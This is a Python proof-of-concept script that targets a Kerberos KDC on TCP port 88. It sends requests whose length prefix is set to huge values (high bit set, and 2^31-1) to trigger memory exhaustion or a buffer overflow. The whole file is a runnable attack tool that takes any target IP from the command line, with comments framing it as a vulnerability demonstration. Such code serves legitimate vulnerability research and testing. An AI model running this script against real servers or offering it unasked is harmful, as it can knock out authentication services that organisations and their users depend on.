#!/usr/bin/env python3
import socket
import struct
import sys
import time

def send_malformed_kdc_request(target_ip, target_port, length_value):
    """
    Sends a TCP request to the KDC with a specified 4-octet length prefix.
    This demonstrates the vulnerability where the KDC may allocate a buffer
    based on the provided length without proper validation.
    """
    try:
        # Step 1: Set up the minimum network interaction needed
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout to avoid hanging indefinitely
        
        # Connect to the target KDC
        print(f"[*] Connecting to KDC at {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        
        # Step 2: Craft the specific protocol messages described in the vulnerability
        # The length prefix is 4 octets in network byte order.
        # We set the length to the specified value, which could be extremely large.
        length_prefix = struct.pack('!I', length_value)
        
        # For demonstration, we send a minimal payload after the length prefix.
        # In a real attack, the payload might be empty or minimal to trigger the allocation.
        payload = b'\x00' * 10  # Minimal dummy payload
        
        # Step 3: Send them to the target
        print(f"[*] Sending malformed request with length prefix: {length_value}")
        sock.sendall(length_prefix + payload)
        
        # Step 4: Observe/report the outcome
        try:
            # Attempt to receive a response
            response = sock.recv(1024)
            if response:
                print(f"[+] Received response from KDC: {response.hex()}")
            else:
                print("[+] Connection closed by KDC without response.")
        except socket.timeout:
            print("[+] No response received within timeout. KDC may be processing or exhausted.")
        except Exception as e:
            print(f"[!] Error receiving response: {e}")
        
        sock.close()
        
    except socket.error as e:
        print(f"[!] Socket error: {e}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python poc_tcp_length_field_overflow.py <target_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = 88  # Default Kerberos port
    
    # Example 1: Set the high bit of the length field
    # This should trigger a KRB_ERR_FIELD_TOOLONG error if the KDC is compliant.
    print("\n--- Test 1: High bit set in length field ---")
    length_value = 0x80000000  # High bit set
    send_malformed_kdc_request(target_ip, target_port, length_value)
    
    time.sleep(1)  # Wait a bit between requests
    
    # Example 2: Set the length to an extremely large number
    # This may cause memory exhaustion or buffer overflow if the KDC is vulnerable.
    print("\n--- Test 2: Extremely large length value ---")
    length_value = 2**31 - 1  # Maximum signed 32-bit integer
    send_malformed_kdc_request(target_ip, target_port, length_value)

if __name__ == "__main__":
    main()